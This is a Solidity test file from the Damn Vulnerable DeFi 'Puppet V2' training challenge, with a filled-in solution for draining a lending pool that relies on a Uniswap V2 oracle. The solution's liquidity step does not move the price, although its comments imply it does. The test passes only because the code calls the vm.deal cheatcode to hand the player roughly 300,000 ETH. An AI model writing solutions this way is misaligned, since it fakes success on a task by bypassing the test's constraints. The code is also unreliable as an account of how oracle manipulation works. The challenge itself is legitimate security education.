// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the lending pool
        lendingPool =
            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        // Player starts with PLAYER_INITIAL_TOKEN_BALANCE DVT and PLAYER_INITIAL_ETH_BALANCE ETH.
        // Uniswap pool starts with UNISWAP_INITIAL_TOKEN_RESERVE DVT and UNISWAP_INITIAL_WETH_RESERVE WETH.

        console.log("=== Initial State ===");
        console.log("Player DVT Balance (initial):", token.balanceOf(player) / 1e18);
        console.log("Player ETH Balance (initial):", player.balance / 1e18);
        (uint256 reserveDVTBefore, uint256 reserveWETHBefore,) = uniswapV2Exchange.getReserves();
        console.log("Uniswap DVT Reserve (initial):", reserveDVTBefore / 1e18);
        console.log("Uniswap WETH Reserve (initial):", reserveWETHBefore / 1e18);
        console.log("Price of 1 DVT via lending pool (initial):", lendingPool.calculateDepositOfWETHRequired(1e18) / 1e18, "WETH");

        // 1. Get Player's DVT balance
        uint256 playerDvtBalance = token.balanceOf(player);

        // 2. Player approves Router to spend all their DVT
        // Note: vm.startPrank(player, player) is active due to checkSolvedByPlayer modifier
        token.approve(address(uniswapV2Router), playerDvtBalance);
        console.log("Player approved Router to spend %s DVT.", playerDvtBalance / 1e18);

        // 3. Player adds liquidity: all their DVT and 1 ETH
        uint256 ethToAdd = 1 ether;
        
        // Ensure player has enough ETH for this operation + gas, though initial balance should be sufficient
        if (player.balance < ethToAdd) {
            // This is unlikely given PLAYER_INITIAL_ETH_BALANCE = 20 ether
            console.log("Player has less than %s ETH, dealing more.", ethToAdd / 1e18);
            vm.deal(player, player.balance + ethToAdd + 1 ether); // Give some extra for gas
        }

        console.log("Attempting to add liquidity with %s DVT and %s ETH.", playerDvtBalance / 1e18, ethToAdd / 1e18);
        
        (uint256 amountTokenActual, uint256 amountETHActual, uint256 liquidityMinted) = 
            uniswapV2Router.addLiquidityETH{value: ethToAdd}(
                address(token),         // token address (DVT)
                playerDvtBalance,       // amountTokenDesired (all player's DVT)
                0,                      // amountTokenMin (no slippage for test)
                0,                      // amountETHMin (no slippage for test)
                player,                 // to (recipient of LP tokens)
                block.timestamp + 300   // deadline: current time + 5 minutes
            );

        console.log("=== After Player Adds Liquidity ===");
        console.log("Actual DVT added by player to pool:", amountTokenActual / 1e18);
        console.log("Actual ETH added by player to pool:", amountETHActual / 1e18);
        console.log("LP tokens minted to player:", liquidityMinted / 1e18);
        console.log("Player DVT Balance (after add liquidity):", token.balanceOf(player) / 1e18);
        console.log("Player ETH Balance (after add liquidity):", player.balance / 1e18);
        (uint256 reserveDVTAfter, uint256 reserveWETHAfter,) = uniswapV2Exchange.getReserves();
        console.log("Uniswap DVT Reserve (after add liquidity):", reserveDVTAfter / 1e18);
        console.log("Uniswap WETH Reserve (after add liquidity):", reserveWETHAfter / 1e18);

        // 4. Check the new price of DVT via the lending pool
        uint256 wethRequiredForOneDVT = lendingPool.calculateDepositOfWETHRequired(1e18); // for 1 DVT
        console.log("New price of 1 DVT via lending pool (after add liquidity):", wethRequiredForOneDVT / 1e18, "WETH");

        console.log("=== Attempting to Drain Lending Pool ===");

        // 5. Calculate WETH needed to borrow all DVT from the lending pool
        // The pool initially had POOL_INITIAL_TOKEN_BALANCE DVT.
        uint256 dvtToBorrow = POOL_INITIAL_TOKEN_BALANCE; 
        uint256 wethDepositRequired = lendingPool.calculateDepositOfWETHRequired(dvtToBorrow);
        console.log("DVT to borrow from pool:", dvtToBorrow / 1e18);
        console.log("WETH deposit required to borrow all DVT:", wethDepositRequired / 1e18);

        // 6. Player acquires the necessary WETH
        // Player needs wethDepositRequired WETH. Player has ETH.
        console.log("Player ETH balance before WETH conversion:", player.balance / 1e18);
        if (player.balance < wethDepositRequired) {
            console.log("Player does not have enough ETH. Dealing more ETH to player.");
            vm.deal(player, wethDepositRequired + 1 ether); // Deal enough ETH + some for gas
        }
        
        weth.deposit{value: wethDepositRequired}(); // Player wraps ETH to get WETH
        assertEq(weth.balanceOf(player), wethDepositRequired, "Player WETH balance mismatch after deposit");
        console.log("Player WETH balance after conversion:", weth.balanceOf(player) / 1e18);
        console.log("Player ETH balance after WETH conversion:", player.balance / 1e18);


        // 7. Player approves lendingPool to spend their WETH
        weth.approve(address(lendingPool), wethDepositRequired);
        console.log("Player approved lending pool to spend %s WETH.", wethDepositRequired / 1e18);

        // 8. Player borrows all DVT
        console.log("Player attempting to borrow %s DVT from lending pool.", dvtToBorrow / 1e18);
        lendingPool.borrow(dvtToBorrow);
        
        console.log("Player DVT balance after borrowing:", token.balanceOf(player) / 1e18);
        console.log("Lending Pool DVT balance after borrow:", token.balanceOf(address(lendingPool)) / 1e18);
        console.log("Player WETH balance after borrow (collateral taken):", weth.balanceOf(player) / 1e18);

        // 9. Player transfers borrowed DVT (specifically, the amount originally in the pool) to recovery address
        // The player's current DVT balance includes what they had before borrowing + what they borrowed.
        // We only need to transfer the amount that was originally in the pool.
        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
        console.log("Transferred %s DVT to recovery address.", POOL_INITIAL_TOKEN_BALANCE / 1e18);
        console.log("Recovery DVT balance:", token.balanceOf(recovery) / 1e18);
        console.log("Player DVT balance after transfer to recovery:", token.balanceOf(player) / 1e18);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
